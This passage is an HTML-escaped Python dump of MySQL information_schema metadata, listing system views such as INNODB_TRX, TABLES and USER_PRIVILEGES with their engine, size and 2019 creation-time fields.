&#39;&#39;, &#39;TABLE_COMMENT&#39;: &#39;&#39;}, {&#39;TABLE_CATALOG&#39;: &#39;def&#39;, &#39;TABLE_SCHEMA&#39;: &#39;information_schema&#39;, &#39;TABLE_NAME&#39;: &#39;INNODB_TABLESTATS&#39;, &#39;TABLE_TYPE&#39;: &#39;SYSTEM VIEW&#39;, &#39;ENGINE&#39;: None, &#39;VERSION&#39;: 10, &#39;ROW_FORMAT&#39;: None, &#39;TABLE_ROWS&#39;: 0, &#39;AVG_ROW_LENGTH&#39;: 0, &#39;DATA_LENGTH&#39;: 0, &#39;MAX_DATA_LENGTH&#39;: 0, &#39;INDEX_LENGTH&#39;: 0, &#39;DATA_FREE&#39;: 0, &#39;AUTO_INCREMENT&#39;: None, &#39;CREATE_TIME&#39;: datetime.datetime(2019, 2, 2, 17, 59, 49), &#39;UPDATE_TIME&#39;: None, &#39;CHECK_TIME&#39;: None, &#39;TABLE_COLLATION&#39;: None, &#39;CHECKSUM&#39;: None, &#39;CREATE_OPTIONS&#39;: &#39;&#39;, &#39;TABLE_COMMENT&#39;: &#39;&#39;}, {&#39;TABLE_CATALOG&#39;: &#39;def&#39;, &#39;TABLE_SCHEMA&#39;: &#39;information_schema&#39;, &#39;TABLE_NAME&#39;: &#39;INNODB_TEMP_TABLE_INFO&#39;, &#39;TABLE_TYPE&#39;: &#39;SYSTEM VIEW&#39;, &#39;ENGINE&#39;: None, &#39;VERSION&#39;: 10, &#39;ROW_FORMAT&#39;: None, &#39;TABLE_ROWS&#39;: 0, &#39;AVG_ROW_LENGTH&#39;: 0, &#39;DATA_LENGTH&#39;: 0, &#39;MAX_DATA_LENGTH&#39;: 0, &#39;INDEX_LENGTH&#39;: 0, &#39;DATA_FREE&#39;: 0, &#39;AUTO_INCREMENT&#39;: None, &#39;CREATE_TIME&#39;: datetime.datetime(2019, 2, 2, 17, 59, 49), &#39;UPDATE_TIME&#39;: None, &#39;CHECK_TIME&#39;: None, &#39;TABLE_COLLATION&#39;: None, &#39;CHECKSUM&#39;: None, &#39;CREATE_OPTIONS&#39;: &#39;&#39;, &#39;TABLE_COMMENT&#39;: &#39;&#39;}, {&#39;TABLE_CATALOG&#39;: &#39;def&#39;, &#39;TABLE_SCHEMA&#39;: &#39;information_schema&#39;, &#39;TABLE_NAME&#39;: &#39;INNODB_TRX&#39;, &#39;TABLE_TYPE&#39;: &#39;SYSTEM VIEW&#39;, &#39;ENGINE&#39;: None, &#39;VERSION&#39;: 10, &#39;ROW_FORMAT&#39;: None, &#39;TABLE_ROWS&#39;: 0, &#39;AVG_ROW_LENGTH&#39;: 0, &#39;DATA_LENGTH&#39;: 0, &#39;MAX_DATA_LENGTH&#39;: 0, &#39;INDEX_LENGTH&#39;: 0, &#39;DATA_FREE&#39;: 0, &#39;AUTO_INCREMENT&#39;: None, &#39;CREATE_TIME&#39;: datetime.datetime(2019, 2, 2, 17, 59, 49), &#39;UPDATE_TIME&#39;: None, &#39;CHECK_TIME&#39;: None, &#39;TABLE_COLLATION&#39;: None, &#39;CHECKSUM&#39;: None, &#39;CREATE_OPTIONS&#39;: &#39;&#39;, &#39;TABLE_COMMENT&#39;: &#39;&#39;}, {&#39;TABLE_CATALOG&#39;: &#39;def&#39;, &#39;TABLE_SCHEMA&#39;: &#39;information_schema&#39;, &#39;TABLE_NAME&#39;: &#39;INNODB_VIRTUAL&#39;, &#39;TABLE_TYPE&#39;: &#39;SYSTEM VIEW&#39;, &#39;ENGINE&#39;: None, &#39;VERSION&#39;: 10, &#39;ROW_FORMAT&#39;: None, &#39;TABLE_ROWS&#39;: 0, &#39;AVG_ROW_LENGTH&#39;: 0, &#39;DATA_LENGTH&#39;: 0, &#39;MAX_DATA_LENGTH&#39;: 0, &#39;INDEX_LENGTH&#39;: 0, &#39;DATA_FREE&#39;: 0, &#39;AUTO_INCREMENT&#39;: None, &#39;CREATE_TIME&#39;: datetime.datetime(2019, 2, 2, 17, 59, 49), &#39;UPDATE_TIME&#39;: None, &#39;CHECK_TIME&#39;: None, &#39;TABLE_COLLATION&#39;: None, &#39;CHECKSUM&#39;: None, &#39;CREATE_OPTIONS&#39;: &#39;&#39;, &#39;TABLE_COMMENT&#39;: &#39;&#39;}, {&#39;TABLE_CATALOG&#39;: &#39;def&#39;, &#39;TABLE_SCHEMA&#39;: &#39;information_schema&#39;, &#39;TABLE_NAME&#39;: &#39;KEYWORDS&#39;, &#39;TABLE_TYPE&#39;: &#39;SYSTEM VIEW&#39;, &#39;ENGINE&#39;: None, &#39;VERSION&#39;: 10, &#39;ROW_FORMAT&#39;: None, &#39;TABLE_ROWS&#39;: 0, &#39;AVG_ROW_LENGTH&#39;: 0, &#39;DATA_LENGTH&#39;: 0, &#39;MAX_DATA_LENGTH&#39;: 0, &#39;INDEX_LENGTH&#39;: 0, &#39;DATA_FREE&#39;: 0, &#39;AUTO_INCREMENT&#39;: None, &#39;CREATE_TIME&#39;: datetime.datetime(2019, 2, 2, 17, 59, 37), &#39;UPDATE_TIME&#39;: None, &#39;CHECK_TIME&#39;: None, &#39;TABLE_COLLATION&#39;: None, &#39;CHECKSUM&#39;: None, &#39;CREATE_OPTIONS&#39;: &#39;&#39;, &#39;TABLE_COMMENT&#39;: &#39;&#39;}, {&#39;TABLE_CATALOG&#39;: &#39;def&#39;, &#39;TABLE_SCHEMA&#39;: &#39;information_schema&#39;, &#39;TABLE_NAME&#39;: &#39;KEY_COLUMN_USAGE&#39;, &#39;TABLE_TYPE&#39;: &#39;SYSTEM VIEW&#39;, &#39;ENGINE&#39;: None, &#39;VERSION&#39;: 10, &#39;ROW_FORMAT&#39;: None, &#39;TABLE_ROWS&#39;: 0, &#39;AVG_ROW_LENGTH&#39;: 0, &#39;DATA_LENGTH&#39;: 0, &#39;MAX_DATA_LENGTH&#39;: 0, &#39;INDEX_LENGTH&#39;: 0, &#39;DATA_FREE&#39;: 0, &#39;AUTO_INCREMENT&#39;: None, &#39;CREATE_TIME&#39;: datetime.datetime(2019, 2, 2, 17, 59, 37), &#39;UPDATE_TIME&#39;: None, &#39;CHECK_TIME&#39;: None, &#39;TABLE_COLLATION&#39;: None, &#39;CHECKSUM&#39;: None, &#39;CREATE_OPTIONS&#39;: &#39;&#39;, &#39;TABLE_COMMENT&#39;: &#39;&#39;}, {&#39;TABLE_CATALOG&#39;: &#39;def&#39;, &#39;TABLE_SCHEMA&#39;: &#39;information_schema&#39;, &#39;TABLE_NAME&#39;: &#39;OPTIMIZER_TRACE&#39;, &#39;TABLE_TYPE&#39;: &#39;SYSTEM VIEW&#39;, &#39;ENGINE&#39;: None, &#39;VERSION&#39;: 10, &#39;ROW_FORMAT&#39;: None, &#39;TABLE_ROWS&#39;: 0, &#39;AVG_ROW_LENGTH&#39;: 0, &#39;DATA_LENGTH&#39;: 0, &#39;MAX_DATA_LENGTH&#39;: 0, &#39;INDEX_LENGTH&#39;: 0, &#39;DATA_FREE&#39;: 0, &#39;AUTO_INCREMENT&#39;: None, &#39;CREATE_TIME&#39;: datetime.datetime(2019, 2, 2, 17, 59, 37), &#39;UPDATE_TIME&#39;: None, &#39;CHECK_TIME&#39;: None, &#39;TABLE_COLLATION&#39;: None, &#39;CHECKSUM&#39;: None, &#39;CREATE_OPTIONS&#39;: &#39;&#39;, &#39;TABLE_COMMENT&#39;: &#39;&#39;}, {&#39;TABLE_CATALOG&#39;: &#39;def&#39;, &#39;TABLE_SCHEMA&#39;: &#39;information_schema&#39;, &#39;TABLE_NAME&#39;: &#39;PARAMETERS&#39;, &#39;TABLE_TYPE&#39;: &#39;SYSTEM VIEW&#39;, &#39;ENGINE&#39;: None, &#39;VERSION&#39;: 10, &#39;ROW_FORMAT&#39;: None, &#39;TABLE_ROWS&#39;: 0, &#39;AVG_ROW_LENGTH&#39;: 0, &#39;DATA_LENGTH&#39;: 0, &#39;MAX_DATA_LENGTH&#39;: 0, &#39;INDEX_LENGTH&#39;: 0, &#39;DATA_FREE&#39;: 0, &#39;AUTO_INCREMENT&#39;: None, &#39;CREATE_TIME&#39;: datetime.datetime(2019, 2, 2, 17, 59, 37), &#39;UPDATE_TIME&#39;: None, &#39;CHECK_TIME&#39;: None, &#39;TABLE_COLLATION&#39;: None, &#39;CHECKSUM&#39;: None, &#39;CREATE_OPTIONS&#39;: &#39;&#39;, &#39;TABLE_COMMENT&#39;: &#39;&#39;}, {&#39;TABLE_CATALOG&#39;: &#39;def&#39;, &#39;TABLE_SCHEMA&#39;: &#39;information_schema&#39;, &#39;TABLE_NAME&#39;: &#39;PARTITIONS&#39;, &#39;TABLE_TYPE&#39;: &#39;SYSTEM VIEW&#39;, &#39;ENGINE&#39;: None, &#39;VERSION&#39;: 10, &#39;ROW_FORMAT&#39;: None, &#39;TABLE_ROWS&#39;: 0, &#39;AVG_ROW_LENGTH&#39;: 0, &#39;DATA_LENGTH&#39;: 0, &#39;MAX_DATA_LENGTH&#39;: 0, &#39;INDEX_LENGTH&#39;: 0, &#39;DATA_FREE&#39;: 0, &#39;AUTO_INCREMENT&#39;: None, &#39;CREATE_TIME&#39;: datetime.datetime(2019, 2, 2, 17, 59, 37), &#39;UPDATE_TIME&#39;: None, &#39;CHECK_TIME&#39;: None, &#39;TABLE_COLLATION&#39;: None, &#39;CHECKSUM&#39;: None, &#39;CREATE_OPTIONS&#39;: &#39;&#39;, &#39;TABLE_COMMENT&#39;: &#39;&#39;}, {&#39;TABLE_CATALOG&#39;: &#39;def&#39;, &#39;TABLE_SCHEMA&#39;: &#39;information_schema&#39;, &#39;TABLE_NAME&#39;: &#39;PLUGINS&#39;, &#39;TABLE_TYPE&#39;: &#39;SYSTEM VIEW&#39;, &#39;ENGINE&#39;: None, &#39;VERSION&#39;: 10, &#39;ROW_FORMAT&#39;: None, &#39;TABLE_ROWS&#39;: 0, &#39;AVG_ROW_LENGTH&#39;: 0, &#39;DATA_LENGTH&#39;: 0, &#39;MAX_DATA_LENGTH&#39;: 0, &#39;INDEX_LENGTH&#39;: 0, &#39;DATA_FREE&#39;: 0, &#39;AUTO_INCREMENT&#39;: None, &#39;CREATE_TIME&#39;: datetime.datetime(2019, 2, 2, 17, 59, 37), &#39;UPDATE_TIME&#39;: None, &#39;CHECK_TIME&#39;: None, &#39;TABLE_COLLATION&#39;: None, &#39;CHECKSUM&#39;: None, &#39;CREATE_OPTIONS&#39;: &#39;&#39;, &#39;TABLE_COMMENT&#39;: &#39;&#39;}, {&#39;TABLE_CATALOG&#39;: &#39;def&#39;, &#39;TABLE_SCHEMA&#39;: &#39;information_schema&#39;, &#39;TABLE_NAME&#39;: &#39;PROCESSLIST&#39;, &#39;TABLE_TYPE&#39;: &#39;SYSTEM VIEW&#39;, &#39;ENGINE&#39;: None, &#39;VERSION&#39;: 10, &#39;ROW_FORMAT&#39;: None, &#39;TABLE_ROWS&#39;: 0, &#39;AVG_ROW_LENGTH&#39;: 0, &#39;DATA_LENGTH&#39;: 0, &#39;MAX_DATA_LENGTH&#39;: 0, &#39;INDEX_LENGTH&#39;: 0, &#39;DATA_FREE&#39;: 0, &#39;AUTO_INCREMENT&#39;: None, &#39;CREATE_TIME&#39;: datetime.datetime(2019, 2, 2, 17, 59, 37), &#39;UPDATE_TIME&#39;: None, &#39;CHECK_TIME&#39;: None, &#39;TABLE_COLLATION&#39;: None, &#39;CHECKSUM&#39;: None, &#39;CREATE_OPTIONS&#39;: &#39;&#39;, &#39;TABLE_COMMENT&#39;: &#39;&#39;}, {&#39;TABLE_CATALOG&#39;: &#39;def&#39;, &#39;TABLE_SCHEMA&#39;: &#39;information_schema&#39;, &#39;TABLE_NAME&#39;: &#39;PROFILING&#39;, &#39;TABLE_TYPE&#39;: &#39;SYSTEM VIEW&#39;, &#39;ENGINE&#39;: None, &#39;VERSION&#39;: 10, &#39;ROW_FORMAT&#39;: None, &#39;TABLE_ROWS&#39;: 0, &#39;AVG_ROW_LENGTH&#39;: 0, &#39;DATA_LENGTH&#39;: 0, &#39;MAX_DATA_LENGTH&#39;: 0, &#39;INDEX_LENGTH&#39;: 0, &#39;DATA_FREE&#39;: 0, &#39;AUTO_INCREMENT&#39;: None, &#39;CREATE_TIME&#39;: datetime.datetime(2019, 2, 2, 17, 59, 37), &#39;UPDATE_TIME&#39;: None, &#39;CHECK_TIME&#39;: None, &#39;TABLE_COLLATION&#39;: None, &#39;CHECKSUM&#39;: None, &#39;CREATE_OPTIONS&#39;: &#39;&#39;, &#39;TABLE_COMMENT&#39;: &#39;&#39;}, {&#39;TABLE_CATALOG&#39;: &#39;def&#39;, &#39;TABLE_SCHEMA&#39;: &#39;information_schema&#39;, &#39;TABLE_NAME&#39;: &#39;REFERENTIAL_CONSTRAINTS&#39;, &#39;TABLE_TYPE&#39;: &#39;SYSTEM VIEW&#39;, &#39;ENGINE&#39;: None, &#39;VERSION&#39;: 10, &#39;ROW_FORMAT&#39;: None, &#39;TABLE_ROWS&#39;: 0, &#39;AVG_ROW_LENGTH&#39;: 0, &#39;DATA_LENGTH&#39;: 0, &#39;MAX_DATA_LENGTH&#39;: 0, &#39;INDEX_LENGTH&#39;: 0, &#39;DATA_FREE&#39;: 0, &#39;AUTO_INCREMENT&#39;: None, &#39;CREATE_TIME&#39;: datetime.datetime(2019, 2, 2, 17, 59, 37), &#39;UPDATE_TIME&#39;: None, &#39;CHECK_TIME&#39;: None, &#39;TABLE_COLLATION&#39;: None, &#39;CHECKSUM&#39;: None, &#39;CREATE_OPTIONS&#39;: &#39;&#39;, &#39;TABLE_COMMENT&#39;: &#39;&#39;}, {&#39;TABLE_CATALOG&#39;: &#39;def&#39;, &#39;TABLE_SCHEMA&#39;: &#39;information_schema&#39;, &#39;TABLE_NAME&#39;: &#39;RESOURCE_GROUPS&#39;, &#39;TABLE_TYPE&#39;: &#39;SYSTEM VIEW&#39;, &#39;ENGINE&#39;: None, &#39;VERSION&#39;: 10, &#39;ROW_FORMAT&#39;: None, &#39;TABLE_ROWS&#39;: 0, &#39;AVG_ROW_LENGTH&#39;: 0, &#39;DATA_LENGTH&#39;: 0, &#39;MAX_DATA_LENGTH&#39;: 0, &#39;INDEX_LENGTH&#39;: 0, &#39;DATA_FREE&#39;: 0, &#39;AUTO_INCREMENT&#39;: None, &#39;CREATE_TIME&#39;: datetime.datetime(2019, 2, 2, 17, 59, 37), &#39;UPDATE_TIME&#39;: None, &#39;CHECK_TIME&#39;: None, &#39;TABLE_COLLATION&#39;: None, &#39;CHECKSUM&#39;: None, &#39;CREATE_OPTIONS&#39;: &#39;&#39;, &#39;TABLE_COMMENT&#39;: &#39;&#39;}, {&#39;TABLE_CATALOG&#39;: &#39;def&#39;, &#39;TABLE_SCHEMA&#39;: &#39;information_schema&#39;, &#39;TABLE_NAME&#39;: &#39;ROUTINES&#39;, &#39;TABLE_TYPE&#39;: &#39;SYSTEM VIEW&#39;, &#39;ENGINE&#39;: None, &#39;VERSION&#39;: 10, &#39;ROW_FORMAT&#39;: None, &#39;TABLE_ROWS&#39;: 0, &#39;AVG_ROW_LENGTH&#39;: 0, &#39;DATA_LENGTH&#39;: 0, &#39;MAX_DATA_LENGTH&#39;: 0, &#39;INDEX_LENGTH&#39;: 0, &#39;DATA_FREE&#39;: 0, &#39;AUTO_INCREMENT&#39;: None, &#39;CREATE_TIME&#39;: datetime.datetime(2019, 2, 2, 17, 59, 37), &#39;UPDATE_TIME&#39;: None, &#39;CHECK_TIME&#39;: None, &#39;TABLE_COLLATION&#39;: None, &#39;CHECKSUM&#39;: None, &#39;CREATE_OPTIONS&#39;: &#39;&#39;, &#39;TABLE_COMMENT&#39;: &#39;&#39;}, {&#39;TABLE_CATALOG&#39;: &#39;def&#39;, &#39;TABLE_SCHEMA&#39;: &#39;information_schema&#39;, &#39;TABLE_NAME&#39;: &#39;SCHEMATA&#39;, &#39;TABLE_TYPE&#39;: &#39;SYSTEM VIEW&#39;, &#39;ENGINE&#39;: None, &#39;VERSION&#39;: 10, &#39;ROW_FORMAT&#39;: None, &#39;TABLE_ROWS&#39;: 0, &#39;AVG_ROW_LENGTH&#39;: 0, &#39;DATA_LENGTH&#39;: 0, &#39;MAX_DATA_LENGTH&#39;: 0, &#39;INDEX_LENGTH&#39;: 0, &#39;DATA_FREE&#39;: 0, &#39;AUTO_INCREMENT&#39;: None, &#39;CREATE_TIME&#39;: datetime.datetime(2019, 2, 2, 17, 59, 37), &#39;UPDATE_TIME&#39;: None, &#39;CHECK_TIME&#39;: None, &#39;TABLE_COLLATION&#39;: None, &#39;CHECKSUM&#39;: None, &#39;CREATE_OPTIONS&#39;: &#39;&#39;, &#39;TABLE_COMMENT&#39;: &#39;&#39;}, {&#39;TABLE_CATALOG&#39;: &#39;def&#39;, &#39;TABLE_SCHEMA&#39;: &#39;information_schema&#39;, &#39;TABLE_NAME&#39;: &#39;SCHEMA_PRIVILEGES&#39;, &#39;TABLE_TYPE&#39;: &#39;SYSTEM VIEW&#39;, &#39;ENGINE&#39;: None, &#39;VERSION&#39;: 10, &#39;ROW_FORMAT&#39;: None, &#39;TABLE_ROWS&#39;: 0, &#39;AVG_ROW_LENGTH&#39;: 0, &#39;DATA_LENGTH&#39;: 0, &#39;MAX_DATA_LENGTH&#39;: 0, &#39;INDEX_LENGTH&#39;: 0, &#39;DATA_FREE&#39;: 0, &#39;AUTO_INCREMENT&#39;: None, &#39;CREATE_TIME&#39;: datetime.datetime(2019, 2, 2, 17, 59, 37), &#39;UPDATE_TIME&#39;: None, &#39;CHECK_TIME&#39;: None, &#39;TABLE_COLLATION&#39;: None, &#39;CHECKSUM&#39;: None, &#39;CREATE_OPTIONS&#39;: &#39;&#39;, &#39;TABLE_COMMENT&#39;: &#39;&#39;}, {&#39;TABLE_CATALOG&#39;: &#39;def&#39;, &#39;TABLE_SCHEMA&#39;: &#39;information_schema&#39;, &#39;TABLE_NAME&#39;: &#39;STATISTICS&#39;, &#39;TABLE_TYPE&#39;: &#39;SYSTEM VIEW&#39;, &#39;ENGINE&#39;: None, &#39;VERSION&#39;: 10, &#39;ROW_FORMAT&#39;: None, &#39;TABLE_ROWS&#39;: 0, &#39;AVG_ROW_LENGTH&#39;: 0, &#39;DATA_LENGTH&#39;: 0, &#39;MAX_DATA_LENGTH&#39;: 0, &#39;INDEX_LENGTH&#39;: 0, &#39;DATA_FREE&#39;: 0, &#39;AUTO_INCREMENT&#39;: None, &#39;CREATE_TIME&#39;: datetime.datetime(2019, 2, 2, 17, 59, 37), &#39;UPDATE_TIME&#39;: None, &#39;CHECK_TIME&#39;: None, &#39;TABLE_COLLATION&#39;: None, &#39;CHECKSUM&#39;: None, &#39;CREATE_OPTIONS&#39;: &#39;&#39;, &#39;TABLE_COMMENT&#39;: &#39;&#39;}, {&#39;TABLE_CATALOG&#39;: &#39;def&#39;, &#39;TABLE_SCHEMA&#39;: &#39;information_schema&#39;, &#39;TABLE_NAME&#39;: &#39;ST_GEOMETRY_COLUMNS&#39;, &#39;TABLE_TYPE&#39;: &#39;SYSTEM VIEW&#39;, &#39;ENGINE&#39;: None, &#39;VERSION&#39;: 10, &#39;ROW_FORMAT&#39;: None, &#39;TABLE_ROWS&#39;: 0, &#39;AVG_ROW_LENGTH&#39;: 0, &#39;DATA_LENGTH&#39;: 0, &#39;MAX_DATA_LENGTH&#39;: 0, &#39;INDEX_LENGTH&#39;: 0, &#39;DATA_FREE&#39;: 0, &#39;AUTO_INCREMENT&#39;: None, &#39;CREATE_TIME&#39;: datetime.datetime(2019, 2, 2, 17, 59, 37), &#39;UPDATE_TIME&#39;: None, &#39;CHECK_TIME&#39;: None, &#39;TABLE_COLLATION&#39;: None, &#39;CHECKSUM&#39;: None, &#39;CREATE_OPTIONS&#39;: &#39;&#39;, &#39;TABLE_COMMENT&#39;: &#39;&#39;}, {&#39;TABLE_CATALOG&#39;: &#39;def&#39;, &#39;TABLE_SCHEMA&#39;: &#39;information_schema&#39;, &#39;TABLE_NAME&#39;: &#39;ST_SPATIAL_REFERENCE_SYSTEMS&#39;, &#39;TABLE_TYPE&#39;: &#39;SYSTEM VIEW&#39;, &#39;ENGINE&#39;: None, &#39;VERSION&#39;: 10, &#39;ROW_FORMAT&#39;: None, &#39;TABLE_ROWS&#39;: 0, &#39;AVG_ROW_LENGTH&#39;: 0, &#39;DATA_LENGTH&#39;: 0, &#39;MAX_DATA_LENGTH&#39;: 0, &#39;INDEX_LENGTH&#39;: 0, &#39;DATA_FREE&#39;: 0, &#39;AUTO_INCREMENT&#39;: None, &#39;CREATE_TIME&#39;: datetime.datetime(2019, 2, 2, 17, 59, 37), &#39;UPDATE_TIME&#39;: None, &#39;CHECK_TIME&#39;: None, &#39;TABLE_COLLATION&#39;: None, &#39;CHECKSUM&#39;: None, &#39;CREATE_OPTIONS&#39;: &#39;&#39;, &#39;TABLE_COMMENT&#39;: &#39;&#39;}, {&#39;TABLE_CATALOG&#39;: &#39;def&#39;, &#39;TABLE_SCHEMA&#39;: &#39;information_schema&#39;, &#39;TABLE_NAME&#39;: &#39;ST_UNITS_OF_MEASURE&#39;, &#39;TABLE_TYPE&#39;: &#39;SYSTEM VIEW&#39;, &#39;ENGINE&#39;: None, &#39;VERSION&#39;: 10, &#39;ROW_FORMAT&#39;: None, &#39;TABLE_ROWS&#39;: 0, &#39;AVG_ROW_LENGTH&#39;: 0, &#39;DATA_LENGTH&#39;: 0, &#39;MAX_DATA_LENGTH&#39;: 0, &#39;INDEX_LENGTH&#39;: 0, &#39;DATA_FREE&#39;: 0, &#39;AUTO_INCREMENT&#39;: None, &#39;CREATE_TIME&#39;: datetime.datetime(2019, 2, 2, 17, 59, 37), &#39;UPDATE_TIME&#39;: None, &#39;CHECK_TIME&#39;: None, &#39;TABLE_COLLATION&#39;: None, &#39;CHECKSUM&#39;: None, &#39;CREATE_OPTIONS&#39;: &#39;&#39;, &#39;TABLE_COMMENT&#39;: &#39;&#39;}, {&#39;TABLE_CATALOG&#39;: &#39;def&#39;, &#39;TABLE_SCHEMA&#39;: &#39;information_schema&#39;, &#39;TABLE_NAME&#39;: &#39;TABLES&#39;, &#39;TABLE_TYPE&#39;: &#39;SYSTEM VIEW&#39;, &#39;ENGINE&#39;: None, &#39;VERSION&#39;: 10, &#39;ROW_FORMAT&#39;: None, &#39;TABLE_ROWS&#39;: 0, &#39;AVG_ROW_LENGTH&#39;: 0, &#39;DATA_LENGTH&#39;: 0, &#39;MAX_DATA_LENGTH&#39;: 0, &#39;INDEX_LENGTH&#39;: 0, &#39;DATA_FREE&#39;: 0, &#39;AUTO_INCREMENT&#39;: None, &#39;CREATE_TIME&#39;: datetime.datetime(2019, 2, 2, 17, 59, 37), &#39;UPDATE_TIME&#39;: None, &#39;CHECK_TIME&#39;: None, &#39;TABLE_COLLATION&#39;: None, &#39;CHECKSUM&#39;: None, &#39;CREATE_OPTIONS&#39;: &#39;&#39;, &#39;TABLE_COMMENT&#39;: &#39;&#39;}, {&#39;TABLE_CATALOG&#39;: &#39;def&#39;, &#39;TABLE_SCHEMA&#39;: &#39;information_schema&#39;, &#39;TABLE_NAME&#39;: &#39;TABLESPACES&#39;, &#39;TABLE_TYPE&#39;: &#39;SYSTEM VIEW&#39;, &#39;ENGINE&#39;: None, &#39;VERSION&#39;: 10, &#39;ROW_FORMAT&#39;: None, &#39;TABLE_ROWS&#39;: 0, &#39;AVG_ROW_LENGTH&#39;: 0, &#39;DATA_LENGTH&#39;: 0, &#39;MAX_DATA_LENGTH&#39;: 0, &#39;INDEX_LENGTH&#39;: 0, &#39;DATA_FREE&#39;: 0, &#39;AUTO_INCREMENT&#39;: None, &#39;CREATE_TIME&#39;: datetime.datetime(2019, 2, 2, 17, 59, 37), &#39;UPDATE_TIME&#39;: None, &#39;CHECK_TIME&#39;: None, &#39;TABLE_COLLATION&#39;: None, &#39;CHECKSUM&#39;: None, &#39;CREATE_OPTIONS&#39;: &#39;&#39;, &#39;TABLE_COMMENT&#39;: &#39;&#39;}, {&#39;TABLE_CATALOG&#39;: &#39;def&#39;, &#39;TABLE_SCHEMA&#39;: &#39;information_schema&#39;, &#39;TABLE_NAME&#39;: &#39;TABLE_CONSTRAINTS&#39;, &#39;TABLE_TYPE&#39;: &#39;SYSTEM VIEW&#39;, &#39;ENGINE&#39;: None, &#39;VERSION&#39;: 10, &#39;ROW_FORMAT&#39;: None, &#39;TABLE_ROWS&#39;: 0, &#39;AVG_ROW_LENGTH&#39;: 0, &#39;DATA_LENGTH&#39;: 0, &#39;MAX_DATA_LENGTH&#39;: 0, &#39;INDEX_LENGTH&#39;: 0, &#39;DATA_FREE&#39;: 0, &#39;AUTO_INCREMENT&#39;: None, &#39;CREATE_TIME&#39;: datetime.datetime(2019, 2, 2, 17, 59, 37), &#39;UPDATE_TIME&#39;: None, &#39;CHECK_TIME&#39;: None, &#39;TABLE_COLLATION&#39;: None, &#39;CHECKSUM&#39;: None, &#39;CREATE_OPTIONS&#39;: &#39;&#39;, &#39;TABLE_COMMENT&#39;: &#39;&#39;}, {&#39;TABLE_CATALOG&#39;: &#39;def&#39;, &#39;TABLE_SCHEMA&#39;: &#39;information_schema&#39;, &#39;TABLE_NAME&#39;: &#39;TABLE_PRIVILEGES&#39;, &#39;TABLE_TYPE&#39;: &#39;SYSTEM VIEW&#39;, &#39;ENGINE&#39;: None, &#39;VERSION&#39;: 10, &#39;ROW_FORMAT&#39;: None, &#39;TABLE_ROWS&#39;: 0, &#39;AVG_ROW_LENGTH&#39;: 0, &#39;DATA_LENGTH&#39;: 0, &#39;MAX_DATA_LENGTH&#39;: 0, &#39;INDEX_LENGTH&#39;: 0, &#39;DATA_FREE&#39;: 0, &#39;AUTO_INCREMENT&#39;: None, &#39;CREATE_TIME&#39;: datetime.datetime(2019, 2, 2, 17, 59, 37), &#39;UPDATE_TIME&#39;: None, &#39;CHECK_TIME&#39;: None, &#39;TABLE_COLLATION&#39;: None, &#39;CHECKSUM&#39;: None, &#39;CREATE_OPTIONS&#39;: &#39;&#39;, &#39;TABLE_COMMENT&#39;: &#39;&#39;}, {&#39;TABLE_CATALOG&#39;: &#39;def&#39;, &#39;TABLE_SCHEMA&#39;: &#39;information_schema&#39;, &#39;TABLE_NAME&#39;: &#39;TRIGGERS&#39;, &#39;TABLE_TYPE&#39;: &#39;SYSTEM VIEW&#39;, &#39;ENGINE&#39;: None, &#39;VERSION&#39;: 10, &#39;ROW_FORMAT&#39;: None, &#39;TABLE_ROWS&#39;: 0, &#39;AVG_ROW_LENGTH&#39;: 0, &#39;DATA_LENGTH&#39;: 0, &#39;MAX_DATA_LENGTH&#39;: 0, &#39;INDEX_LENGTH&#39;: 0, &#39;DATA_FREE&#39;: 0, &#39;AUTO_INCREMENT&#39;: None, &#39;CREATE_TIME&#39;: datetime.datetime(2019, 2, 2, 17, 59, 37), &#39;UPDATE_TIME&#39;: None, &#39;CHECK_TIME&#39;: None, &#39;TABLE_COLLATION&#39;: None, &#39;CHECKSUM&#39;: None, &#39;CREATE_OPTIONS&#39;: &#39;&#39;, &#39;TABLE_COMMENT&#39;: &#39;&#39;}, {&#39;TABLE_CATALOG&#39;: &#39;def&#39;, &#39;TABLE_SCHEMA&#39;: &#39;information_schema&#39;, &#39;TABLE_NAME&#39;: &#39;USER_PRIVILEGES&#39;, &#39;TABLE_TYPE&#39;: &#39;SYSTEM VIEW&#39;, &#39;ENGINE&#39;: None, &#39;VERSION&#39;: 10, &#39;ROW_FORMAT&#39;: None, &#39;TABLE_ROWS&#39;: 0, &#39;AVG_ROW_LENGTH&#39;: 0, &#39;DATA_LENGTH&#39;: 0, &#39;MAX_DATA_LENGTH&#39;: 0, &#39;INDEX_LENGTH&#39;: 0, &#39;DATA_FREE&#39;: 0, &#39;AUTO_INCREMENT&#39;: None, &#39;CREATE_TIME&#39;: datetime.datetime(2019, 2, 2, 17, 59, 37), &#39;UPDATE_TIME&#39;: None, &#39;CHECK_TIME&#39;: None, &#39;TABLE_COLLATION&#39;: None, &#39;CHECKSUM&#39;: None, &#39;CREATE_OPTIONS&#39;: &#39;&#39;, &#39;TABLE_COMMENT&#39;: &#39;&#39;}, {&#39;TABLE_CATALOG&#39;: &#39;def&#39;, &#39;TABLE_SCHEMA&#39;: &#39;information_schema&#39;, &#39;TABLE_NAME&#39;: &#39;VIEWS&#39;, &#39;TABLE_TYPE&#39;: &#39;SYSTEM VIEW&#39;, &#39;ENGINE&#39;: None, &#39;VERSION&#39;: 10, &#39;ROW_FORMAT&#39;: None, &#39;TABLE_ROWS&#39;: 0, &#39;AVG_ROW_LENGTH&#39;: 0, &#39;DATA_LENGTH&#39;: 0, &#39;MAX_DATA_LENGTH&#39;: 0, &#39;INDEX_LENGTH&#39;: 0, &#39;DATA_FREE&#39;: 0, &#39;AUTO_INCREMENT&#39;: None, &#39;CREATE_TIME&#39;: datetime.datetime(2019, 2, 2, 17, 59, 37), &#39;UPDATE_TIME&#39;: None, &#39;CHECK_TIME&#39;: None, &#39;TABLE_COLLATION&#39;: None, &#39;CHECKSUM&#39;: None, &#39;CREATE_OPTIONS&#39;: &#39;&#39;, &#39;TABLE_COMMENT&#39;: &#39;&#39;}, {&#39;TABLE_CATALOG&#39;: &#39;def&#39;, &#39;TABLE_SCHEMA&#39;: &#39;information_schema&#39;, &#39;TABLE_NAME&#39;: &#39;VIEW_ROUTINE_USAGE&#39;, &#39;TABLE_TYPE&#39;: &#39;SYSTEM VIEW&#39;, &#39;ENGINE&#39;: None, &#39;VERSION&#39;: 10, &#39;ROW_FORMAT&#39;: None, &#39;TABLE_ROWS&#39;: 0, &#39;AVG_ROW_LENGTH&#39;: 0, &#39;DATA_LENGTH&#39;: 0, &#39;MAX_DATA_LENGTH&#39;: 0, &#39;INDEX_LENGTH&#39;: 0, &#39;DATA_FREE&#39;: 